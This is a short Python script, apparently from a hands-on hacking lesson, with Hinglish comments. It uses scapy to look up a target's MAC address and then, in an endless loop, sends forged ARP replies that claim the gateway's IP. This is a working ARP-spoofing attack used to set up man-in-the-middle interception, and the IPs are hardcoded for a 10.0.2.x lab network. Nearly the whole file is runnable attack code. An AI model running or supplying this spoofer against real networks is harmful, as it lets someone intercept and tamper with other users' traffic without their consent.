import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # Technical Term: ARP Request Broadcast
    # Hum network par pooch rahe hain ki is IP ka MAC kya hai
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    # srp() stands for Send and Receive Packets (Layer 2)
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        # Agar MAC nahi mila toh script yahan se return ho jayega
        print(f"\n[-] Could not find MAC for {target_ip}. Check if IP is correct.")
        return False
    
    # op=2 means ARP Response (Hume fake reply bhej rahe hain)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

# --- TUMHARE NETWORK KE HISAB SE CORRECT IPs ---
# target_ip: Jise dhoka dena hai (Hmare case mein Gateway)
# gateway_ip: Jiski jagah hume leni hai
target_ip = "10.0.2.2"     # Fixed based on your 'ip route'
gateway_ip = "10.0.2.1"    # Fake Source IP

print("[+] ARP Spoofer Started... [Ctrl+C to Stop]")

sent_packets_count = 0
try:
    while True:
        # Script ab 10.0.2.2 ko fake packets bhejega
        if spoof(target_ip, gateway_ip):
            sent_packets_count += 1
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            sys.stdout.flush()
        
        time.sleep(2) 
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C ... Quitting.")
